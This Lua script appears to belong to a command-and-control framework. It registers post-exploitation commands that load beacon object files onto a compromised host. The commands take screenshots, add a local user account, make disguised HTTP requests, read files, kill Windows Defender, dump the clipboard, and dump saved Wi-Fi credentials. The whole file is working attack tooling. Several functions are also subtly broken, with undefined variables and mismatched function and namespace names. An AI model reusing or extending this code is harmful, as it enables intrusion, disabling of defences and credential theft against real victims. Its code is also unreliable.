local parent_command = "common"

local function bof_path(bof_name, arch)
    return "RTKit/bof/" .. bof_name .. "." .. arch .. ".o"
end

local function command_register(command_name, command_function, help_string, ttp)
    command(rt.parent_command .. ":" .. command_name, command_function, help_string, ttp)
end

-- screenshot
function situational.run_screenshot(args)
    local filename
    if #args == 1 then
        filename = args[1]
    else
        filename = "screenshot.jpg"
    end
    local packed_args = bof_pack("z", filename)
    local session = active()
    local arch = session.Os.Arch
    local result = bof(session, script_resource(
            situational.bof_dir .. "screenshot" .. "." .. arch ..
                    ".o"), packed_args, true,
            callback_bof(session, filename))
    if result == false then return "Screenshot failed" end
    return "Screenshot OK"
end
command("screenshot_bof", situational.run_screenshot,
        "Command: situational screenshot <filename>", "T1113")



-- netUserAdd
function rt.parse_netuseradd_bof(args)
    size = #args
    if size < 2 then
        error(">=2 arguments are allowed")
    end
    username = args[1]
    password = args[2]
    return bof_pack("ZZ", username, password)
end
function rt.run_netuseradd_bof(args)
    args = rt.parse_netuseradd_bof(args)
    local session = active()
    is_admin = session.Os.IsAdmin
    if not is_admin then
        error("You need to be an admin to run this command")
    end
    local bof_file = bof_path("NetUserAdd", arch)
    return bof(session, script_resource(bof_file), args, true)
end
command_register("netuseradd", rt.run_netuseradd_bof, "netuseradd_bof <username> <password>", "")

-- curl
function rt.parse_curl_bof(args)
    size = #args
    if size < 1 then
        error(">=1 arguments are allowed")
    end
    local host = args[1]
    local port = "80"
    local method = "GET"
    local header = "Accept: */*"
    local userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
    local body = ""

    if size >= 2 then
        port = args[2]
    end
    local valid_methods = {
        GET = true,
        POST = true,
        PUT = true,
        PATCH = true,
        DELETE = true
    }
    if size >= 3 then
        method = args[3]
        if not valid_methods[method] then
            error("HTTP method " .. method .. " isn't valid.")
        end
    end
    local printoutput = 0
    if args[4] == "--show" then
        printoutput = 1
    end
    proxy = 1
    if args[4] == "--noproxy" then
        proxy = 0
    end
    if size >= 5 then
        userAgent = args[5]
    end
    if size >= 6 then
        header = args[6]
    end
    if size >= 7 then
        body = args[7]
    end
    return bof_pack("zizizzzi", host, port, method, printoutput, userAgent, header, body, proxy)
end

function rt.run_curl_bof(args)
    args = rt.parse_curl_bof(args)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("curl",arch)
    return bof(session, script_resource(bof_file), args, true)
end
command_register("curl", rt.run_curl_bof, "curl <host> [port] [method] [--show|--noproxy] [userAgent] [header] [body]", "")
-- readfile
function rt.parse_readfile_bof(args)
    size = #args
    if size < 1 then
        error(">=1 arguments are allowed")
    end
    file_path = args[1]
    return bof_pack("z", file_path)
end
function rt.run_readfile_bof(args)
    args = rt.parse_readfile(args)
    session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("readfile", arch)
    return bof(session, script_resource(bof_file), args, true)
end
command_register("readfile", rt.run_readfile_bof, "readfile_bof <file_path>", "")
-- kill_defender
function rt.parse_kill_defender_bof(args)
    local size = #args
    if size < 1 then
        error(">=1 arguments are allowed")
    end
    local action = args[1]
    if action == "kill" or action == "check" then
        local username = session.Os.Username
    end
    return bof_pack("z", args[1])
end
function rt.run_kill_defender_bof(args)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("kill_defender", arch)
    return bof(session, script_resource(bof_file), args, true)
end
command_register("kill_defender", rt.run_kill_defender_bof, "kill_defender_bof <action>", "")
-- clipboard
function rt.run_clipboard_bof(args)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("clipboard", arch)
    return bof(session, script_resource(bof_file), args, true)
end
-- dump clipboard
function rt.run_dump_clipboard(args)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("dump_clipboard", arch)
    return bof(session, script_resource(bof_file), args, true)
end
command_register("dump_clipboard", rt.run_dump_clipboard, "dump_clipboard_bof", "")
-- wifidump
function rt.parse_wifidump_bof(args)
    local size = #args
    if size < 1 then
        error(">=1 arguments are allowed")
    end
    print(args[1])
    local interface = args[1]
    return bof_pack("Z", interface)
end
function rt.run_wifidump_bof(args)
    args = rt.parse_wifidump_bof(args)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("wifidump", arch)
    return bof(session, script_resource(bof_file), args, true)
end
command_register("wifidump", rt.run_wifidump_bof, "wifidump_bof <profilename>", "")
-- wifienum
function rt.run_wifienum_bof(args)
    if #args > 0 then
        error("no arguments are allowed")
    end
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("wifienum", arch)
    print(bof_file)
    return bof(session, script_resource(bof_file), args, true)
end
command_register("wifienum", rt.run_wifienum_bof, "wifienum_bof", "")